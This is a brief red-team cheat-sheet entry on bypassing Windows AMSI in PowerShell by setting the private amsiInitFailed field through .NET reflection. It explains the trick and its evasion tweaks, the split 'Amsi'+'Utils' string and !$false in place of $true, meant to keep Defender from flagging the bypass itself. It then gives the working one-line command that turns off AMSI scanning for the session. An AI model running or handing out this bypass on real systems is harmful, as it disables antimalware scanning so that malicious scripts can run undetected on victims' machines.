# 16.01 AMSI Bypass 1 amsiInitFailed

> Flip the private static `amsiInitFailed` to `$true` via .NET reflection — split `amsiUtils` to dodge AMSI scanning the bypass itself.

## Overview

Set the private static amsiInitFailed field to $true via .NET reflection. Forces ScanContent() to always return AMSI_RESULT_NOT_DETECTED. String-split 'amsiUtils' to avoid being caught by AMSI on the bypass itself.

## Steps

- String-split: `'Amsi'+'Utils'` avoids triggering Defender on the bypass command.
- **!$false** instead of **$true** — another evasion for the value literal.
- Only disables AMSI for the PowerShell scripting session, NOT for Assembly.Load().

## Commands

### amsiInitFailed bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```
